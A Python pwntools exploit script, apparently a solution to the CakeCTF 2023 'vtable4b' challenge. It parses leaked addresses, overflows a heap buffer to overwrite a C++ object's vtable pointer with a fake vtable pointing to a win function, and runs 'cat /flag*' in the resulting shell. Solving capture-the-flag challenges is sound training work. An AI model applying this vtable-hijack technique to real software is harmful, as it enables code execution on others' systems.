#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

context.arch = "amd64"
context.os = "linux"
io = remote("vtable4b.2023.cakectf.com", 9000)

io.recvuntil(b"<win> = ")
win = int(io.recvline().strip(), 16)
log.info(f"{win=:#x}")
io.sendline(b"3")

message = None
vtable = None
while vtable is None or message is None:
    line = io.recvline()
    if b"message (=" in line:
        message = int(line.split(b" ")[0], 16)
    if b"vtable for Cowsay" in line:
        vtable = int(line.split(b" ")[0], 16)

log.info(f"{message=:#x}")
log.info(f"{vtable=:#x}")

payload = b""
payload += p64(win)
payload = payload.ljust(vtable - message, b"A")
payload += p64(message)
io.sendline(b"2 " + payload)
io.sendline(b"3")
io.sendline(b"1")
io.sendline(b"cat /flag*")

io.interactive()
